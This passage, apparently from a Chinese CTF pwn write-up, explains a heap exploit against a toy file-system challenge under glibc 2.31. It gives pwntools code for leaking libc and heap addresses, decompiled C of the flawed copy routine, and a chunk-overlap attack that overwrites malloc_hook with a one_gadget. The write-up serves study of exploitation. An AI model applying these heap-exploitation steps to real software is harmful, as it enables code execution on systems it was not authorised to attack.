class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;cccc&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x3f2&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;../&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x3f0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;cccc&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;AAAA&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase  = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x3ebca0&lt;/span&gt; +&lt;span class=&#34;number&#34;&gt;0x1ff0c0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;libcbase : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc_hook = libcbase + &lt;span class=&#34;number&#34;&gt;0x1ecb70&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;泄露堆地址&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#泄露堆地址&#34;&gt;#&lt;/a&gt; 泄露堆地址&lt;/h3&gt;
&lt;p&gt;有了上面的思路，泄露堆地址也很容易，glibc2.31 存在 tchche, 拷贝一字节，就可以申请一个 0x20 的 chunk，所以提前布局 2 个 0x20 的 chunk. 申请到的 tache chunk 的 fd 就不为空，我们只需要低位的几个字节就可以，我布局的两个 chunk 很近，我只要覆盖最低字节。然后就泄露了堆地址。值得一提的是，2.31 的 tcache 的 bk 指针指向 tcache，但是申请出来的时候，会自动清空 bk。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#leak the chunk addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;../&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ii&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ii&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rmv(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ii&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rmv(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;../&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x70&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;AAAA&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd(&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)) - &lt;span class=&#34;number&#34;&gt;0x001470&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;最后的攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最后的攻击&#34;&gt;#&lt;/a&gt; 最后的攻击&lt;/h3&gt;
&lt;p&gt;现在 libc 的地址有了，如何实现任意地址写，因为保护全开，优先考虑了 malloc_hook + onegadget 的攻击&lt;/p&gt;
&lt;p&gt;问题来了，如何实现任意地址写？unlink 的攻击无法布局 fakechunk (因为地址只有 6 字节，我们只能写入一个地址)。&lt;/p&gt;
&lt;p&gt;基本的攻击手法必要前提在哪里，溢出，UAF,&lt;/p&gt;
&lt;p&gt;任意地址写，要么我们拿到任意地址的 fakechunk，要么修改文件的 context 的指针，然后 echo 或者 cp。&lt;/p&gt;
&lt;p&gt;我们伪造一个 fakechunk 的可能性不大，所以我们要修改 context 指针。这样的话，没有 uaf，那就考虑 overlap。&lt;/p&gt;
&lt;p&gt;关键点来了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( src-&amp;gt;context || !des-&amp;gt;context )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( src-&amp;gt;context &amp;amp;&amp;amp; des-&amp;gt;context )       &lt;span class=&#34;comment&#34;&gt;// 文件复制到文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v4 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(src-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v5 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(des-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 &amp;gt; v5 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          dest = &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;(des-&amp;gt;context, v4 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(dest-&amp;gt;context, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, v4 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(des-&amp;gt;context, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, v5);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = &lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(dest-&amp;gt;context, src-&amp;gt;context, v4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;                                      &lt;span class=&#34;comment&#34;&gt;// 没有context&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = src-&amp;gt;context;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( result )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          result = des-&amp;gt;context;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !result )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = copycontext(src, des);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;echo 是检查 chunksize, 这里用 strlen，我们 echo 以及 cp 都不会在末尾强行补一个空字符，如果我们申请的 0x28，那么我们就可以填满 chunk 的用户空间，而且数据会与下一个堆块的 chunksize 来年再一个，只要 v4=v5, 就可以修改 chunksize，把后面的 chunk 包含进去。&lt;/p&gt;
&lt;p&gt;我们把文件部署在 actim 后面，0x51 就是我们的文件，&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x130&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x130&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;mmmm&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dbg()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;brva 0x01884&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#change the chunksize wo achieve overlap&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;1&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x51\x04&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dbg()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc_hook : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(malloc_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p64(malloc_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad = p64(malloc_hook)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(pad[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(pad[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dir2&amp;#x27;&lt;/span&gt;,pad[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dbg()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad = p64(onegadget)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;)+pad[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;],&lt;span class=&#34;string&#34;&gt;b&amp;#x27;5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425154952331.png&#34; alt=&#34;image-20220425154952331&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改后&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425155032483.png&#34; alt=&#34;image-20220425155032483&#34;&gt;&lt;/p&gt;
&lt;p&gt;你只能写入一个地址，context 在 chunk 的第四个 8 字节位置，我们要向改掉，申请堆块就要拿到 chunk+0x10 的 chunk&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425155752574.png&#34; alt=&#34;image-20220425155752574&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里就是我们的 5 那个文件。我们目标是申请到她 + 0x10 的 chunk&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425160145339.png&#34; alt=&#34;image-20220425160145339&#34;&gt;&lt;/p&gt;
&lt;p&gt;同时我们已经将 malloc_hook-0x23 的地址写到了对应的 context 指针位置，我们下 main 只需要对他进行编辑&lt;/p&gt;
&lt;p&gt;这里为甚不直接使用 malloc_hook.cp 里面 strlen 返回的是 0，会进行 realloc，但是不是个合法的 fakechunk，realloc 会报错，echo 也要 chunk 的头部信息，所以布置在 malloc_hook-0x23，这个天然的 fakechunk, 最后 echo 进去，或者 cp 也行&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h2&gt;
&lt;p&gt;赛后我们并没有对 exp 进行重新的整理，比较凌乱&lt;/p&gt;
